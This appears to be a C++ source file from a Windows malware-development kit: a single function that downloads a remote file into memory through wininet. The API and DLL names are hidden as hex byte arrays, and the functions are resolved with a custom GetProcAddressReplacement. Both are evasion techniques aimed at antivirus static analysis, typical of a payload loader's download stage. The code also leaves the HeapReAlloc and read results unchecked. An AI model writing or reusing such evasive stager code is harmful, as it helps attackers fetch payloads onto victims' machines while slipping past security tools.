#include <Windows.h>
#include <wininet.h>
#include "winternal.h"  // Contains GetProcAddressReplacement, etc.

//
// Static narrow string definitions (all in hex)
//
static const char s_wininet_dll[] = { 0x77,0x69,0x6E,0x69,0x6E,0x65,0x74,0x2E,0x64,0x6C,0x6C,0x00 }; // "wininet.dll"
static const char s_InternetOpenA[] = { 0x49,0x6E,0x74,0x65,0x72,0x6E,0x65,0x74,0x4F,0x70,0x65,0x6E,0x41,0x00 }; // "InternetOpenA"
static const char s_InternetOpenUrlA[] = { 0x49,0x6E,0x74,0x65,0x72,0x6E,0x65,0x74,0x4F,0x70,0x65,0x6E,0x55,0x72,0x6C,0x41,0x00 }; // "InternetOpenUrlA"
static const char s_InternetReadFile[] = { 0x49,0x6E,0x74,0x65,0x72,0x6E,0x65,0x74,0x52,0x65,0x61,0x64,0x46,0x69,0x6C,0x65,0x00 }; // "InternetReadFile"
static const char s_InternetCloseHandle[] = { 0x49,0x6E,0x74,0x65,0x72,0x6E,0x65,0x74,0x43,0x6C,0x6F,0x73,0x65,0x48,0x61,0x6E,0x64,0x6C,0x65,0x00 }; // "InternetCloseHandle"
static const char s_FileDownloader[] = { 0x46,0x69,0x6C,0x65,0x44,0x6F,0x77,0x6E,0x6C,0x6F,0x61,0x64,0x65,0x72,0x00 }; // "FileDownloader"

//
// Define function pointer types for wininet functions.
//
typedef HINTERNET(WINAPI* pfnInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET(WINAPI* pfnInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* pfnInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pfnInternetCloseHandle)(HINTERNET);

//
// ReadFileFromURLA dynamically loads all required wininet functions.
//
BOOL ReadFileFromURLA(
    IN LPCSTR url,
    OUT PBYTE* ppFileBuffer,
    OUT PDWORD pdwFileSize
)
{
    // Load wininet.dll dynamically.
    HMODULE hWininet = LoadLibraryA(s_wininet_dll);
    if (!hWininet)
        return FALSE;

    // Get function pointers via our replacement.
    pfnInternetOpenA fnInternetOpenA = (pfnInternetOpenA)GetProcAddressReplacement(hWininet, s_InternetOpenA);
    pfnInternetOpenUrlA fnInternetOpenUrlA = (pfnInternetOpenUrlA)GetProcAddressReplacement(hWininet, s_InternetOpenUrlA);
    pfnInternetReadFile fnInternetReadFile = (pfnInternetReadFile)GetProcAddressReplacement(hWininet, s_InternetReadFile);
    pfnInternetCloseHandle fnInternetCloseHandle = (pfnInternetCloseHandle)GetProcAddressReplacement(hWininet, s_InternetCloseHandle);

    if (!fnInternetOpenA || !fnInternetOpenUrlA || !fnInternetReadFile || !fnInternetCloseHandle)
    {
        FreeLibrary(hWininet);
        return FALSE;
    }

    // Open an internet session.
    HINTERNET hInternet = fnInternetOpenA(s_FileDownloader, INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (!hInternet)
    {
        FreeLibrary(hWininet);
        return FALSE;
    }

    // Open the URL.
    HINTERNET hConnect = fnInternetOpenUrlA(hInternet, url, nullptr, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect)
    {
        fnInternetCloseHandle(hInternet);
        FreeLibrary(hWininet);
        return FALSE;
    }

    // Allocate an initial buffer (1MB).
    DWORD dwFileSize = 1024 * 1024;
    PBYTE pBaseAddress = reinterpret_cast<PBYTE>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize));
    if (!pBaseAddress)
    {
        fnInternetCloseHandle(hConnect);
        fnInternetCloseHandle(hInternet);
        FreeLibrary(hWininet);
        return FALSE;
    }

    DWORD dwBytesRead = 0, totalBytesRead = 0;
    do {
        // Expand buffer if needed.
        if (totalBytesRead + 1024 > dwFileSize)
        {
            dwFileSize = (dwFileSize + 1024) * 2;
            pBaseAddress = reinterpret_cast<PBYTE>(HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pBaseAddress, dwFileSize));
        }
        fnInternetReadFile(hConnect, pBaseAddress + totalBytesRead, 1024, &dwBytesRead);
        totalBytesRead += dwBytesRead;
    } while (dwBytesRead > 0);

    *pdwFileSize = totalBytesRead;
    *ppFileBuffer = pBaseAddress;

    // Clean up.
    fnInternetCloseHandle(hConnect);
    fnInternetCloseHandle(hInternet);
    FreeLibrary(hWininet);

    return TRUE;
}
